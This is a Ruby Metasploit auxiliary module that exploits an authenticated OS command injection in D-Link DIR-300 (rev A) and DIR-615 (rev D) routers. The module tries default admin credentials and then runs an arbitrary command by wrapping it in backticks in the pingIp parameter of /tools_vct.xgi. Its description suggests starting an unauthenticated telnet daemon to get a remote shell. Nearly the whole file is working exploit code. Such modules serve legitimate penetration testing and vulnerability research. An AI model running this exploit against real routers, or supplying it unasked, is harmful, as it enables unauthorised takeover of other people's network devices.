##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'D-Link DIR-300 (rev A) / DIR-615 (rev D) Remote Command Execution',
			'Description'     => %q{
					Some D-Link Routers are vulnerable to OS Command injection.
				You will need credentials to the webinterface to access the vulnerable part
				of the application. Default credentials are allways a good starting point.
				admin/admin or admin and blank password could be a first try.
				Note: You will just get the last line of the output back. So it is a bit bad
				if you have commands with output over multiple lines ...

				Hint: To get a remote shell you could start the telnetd without any authentication
				Tested on the following devices:
					* D-Link DIR-300 Hardware revision A, Firmware version 1.04/1.05
					* D-Link DIR-615 Hardware revision D, Firmware version 4.10/4.13
			},
			'Author'          => [ 'm-1-k-3' ],
			'License'         => MSF_LICENSE,
			'References'      =>
				[
					[ 'URL', 'http://www.dlink.de/cs/Satellite?c=TechSupport_C&childpagename=DLinkEurope-DE%2FDLTechProduct&cid=1197319390384&p=1197318958220&packedargs=locale%3D1195806663795&pagename=DLinkEurope-DE%2FDLWrapper' ],
					[ 'URL', 'http://www.dlink.de/cs/Satellite?c=Product_C&childpagename=DLinkEurope-DE%2FDLTechProduct&cid=1197374950653&p=1197318958220&packedargs=QuickLinksParentID%3D1197318958220%26locale%3D1195806663795&pagename=DLinkEurope-DE%2FDLWrapper' ],
				],
			'DisclosureDate' => 'Jan 07 2013'))

		register_options(
			[
				OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
				OptString.new('PASSWORD',[ true, 'Password to login with', 'admin']),
				OptString.new('CMD', [ true, 'The command to execute', 'ping 127.0.0.1'])
			], self.class)
	end

	def run
		uri = '/tools_vct.xgi'
		user = datastore['USERNAME']
		if datastore['PASSWORD'].nil?
			pass = ""
		else
			pass = datastore['PASSWORD']
		end

		print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")

		login_path = "/login.php"

		#valid login response includes the following
		login_check = "\<META\ HTTP\-EQUIV\=Refresh\ CONTENT\=\'0\;\ url\=index.php\'\>"

		begin
			res = send_request_cgi({
					'uri' => login_path,
					'method' => 'POST',
					'vars_post' => {
					"ACTION_POST" => "LOGIN",
					"LOGIN_USER" => "#{user}",
					"LOGIN_PASSWD" => "#{pass}",
					"login" => "+Log+In+"
					}
			})
			return if res.nil?
			return if (res.headers['Server'].nil? or res.headers['Server'] !~ /Mathopd\/1.5p6/)
			return if (res.code == 404)

			if (res.body) =~ /#{login_check}/
				print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
			else
				print_error("#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
				return
			end

		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
			return
		end

		uri = '/tools_vct.xgi'

		print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])

		cmd = Rex::Text.uri_encode(datastore['CMD'])
		data_cmd = "?set/runtime/switch/getlinktype=1&set/runtime/diagnostic/pingIp=%60#{cmd}%60&pingIP="

		begin
			res = send_request_cgi(
				{
					'uri'	=> uri << data_cmd,
					'method' => 'GET',
				})
		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
			return
		end
		print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state\n")
	end
end
